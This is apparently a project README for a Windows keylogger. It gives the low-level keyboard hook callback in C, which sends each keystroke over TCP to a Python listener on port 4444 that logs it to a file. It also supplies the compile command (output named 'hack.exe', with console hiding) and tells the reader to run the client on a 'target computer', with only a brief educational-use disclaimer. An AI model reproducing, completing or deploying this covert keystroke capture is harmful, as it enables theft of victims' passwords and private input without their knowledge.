# Remote Keyboard Monitoring System

This project is a remote keyboard monitoring system that runs on Windows operating system. The system consists of two main components:

1. **Keyboard Monitor (main.c)**: A C program running on Windows that captures keyboard inputs
2. **Server (host.py)**: A Python server program that receives and logs the captured keyboard inputs

## Technical Details

### Client (main.c)
- Uses Windows Low-Level Keyboard Hook (WH_KEYBOARD_LL) for keyboard monitoring
- Implements a callback function (KeyboardProc) to process keyboard events
- Establishes TCP socket connection with the server
- Uses Winsock2 for network communication
- Compilation flags:
  - `-s`: Strip symbols for smaller binary size
  - `-ffunction-sections -fdata-sections`: Enable function and data section optimization
  - `-Wno-write-strings`: Suppress string literal warnings
  - `-fno-exceptions`: Disable exception handling
  - `-fmerge-all-constants`: Merge constants for optimization
  - `-static-libstdc++ -static-libgcc`: Static linking of C++ and GCC libraries
  - `-fpermissive`: Allow non-standard C++ code
  - `-mwindows`: Create Windows GUI application (no console window)
  - `-lws2_32`: Link with Winsock2 library

### Server (host.py)
- Implements a TCP server using Python's socket library
- Listens on port 4444 for incoming connections
- Handles client connections asynchronously
- Logs received data to 'remote_keys.txt' file
- Uses UTF-8 encoding for data handling
- Implements error handling for connection issues

## Code Explanation

### Client Code (main.c)
```c
// Global variables
HHOOK hook;          // Handle to the keyboard hook
LPMSG msg;           // Message structure for Windows messages
bool runThread;      // Control flag for the main loop
SOCKET sock;         // Socket for network communication

// Keyboard hook callback function
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    // Process keyboard events when key is pressed
    if(code == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        // Convert virtual key code to character
        char buffer[256];
        DWORD key = p->vkCode;
        char ch = MapVirtualKeyA(key, MAPVK_VK_TO_CHAR);
        // Send the captured key to server
        snprintf(buffer, sizeof(buffer), "key pressed: %c\n", ch);
        send(sock, buffer, strlen(buffer), 0);
    }
    return CallNextHookEx(hook, code, wParam, lParam);
}

// Socket initialization function
bool initSocket(const char* ip, int port) {
    // Initialize Winsock
    WSADATA wsa;
    struct sockaddr_in server;
    // Create socket and connect to server
    // Returns true if connection successful
}
```

### Server Code (host.py)
```python
# Server configuration
HOST = ''           # Listen on all available interfaces
PORT = 4444         # Default port number
OUTPUT_FILE = 'remote_keys.txt'  # Log file name

# Main server loop
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(1)
    # Accept client connection
    conn, addr = s.accept()
    # Process and log received data
```

## Configuration

### Client Configuration
Before compiling the client, you need to modify the following in `main.c`:
```c
const char* ip = "192.168.1.100";  // Change to your server's IP address
int port = 4444;                   // Change if using different port
```

### Server Configuration
The server's port can be modified in `host.py`:
```python
PORT = 4444  # Change to match client's port
```

## Features

- Real-time keyboard input capture
- Remote server data transmission
- Automatic connection management

## Requirements

### Keyboard Monitor (main.c)
- Windows operating system
- MinGW or Visual Studio (for compilation)
- Winsock2 library

### Server (host.py)
- Python 3.x
- socket library (Python standard library)

## Installation

1. Server side:
```bash
python host.py
```

2. Client side (main.c):
```bash
g++ main.c -o hack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -mwindows -lws2_32
```

## Usage

1. First, start the server program:
```bash
python host.py
```

2. Run the client program on the target computer:
```bash
hack.exe
```

3. While the program is running:
   - All keyboard inputs are sent to the server
   - Captured keys are saved in `remote_keys.txt` file

## Security Warning

This program is for educational purposes only. Unauthorized use on others' computers may be illegal. Only test on your own systems or systems with proper authorization.

